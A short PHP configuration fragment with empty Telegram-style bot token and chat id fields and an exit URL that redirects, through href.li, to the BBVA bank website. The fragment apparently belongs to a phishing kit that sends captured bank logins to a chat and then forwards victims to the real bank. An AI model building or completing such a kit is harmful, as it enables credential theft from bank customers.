<?php
$bot_token = '';
$chat_id = '';
$out_url = 'https://href.li/?https://bbva.es/';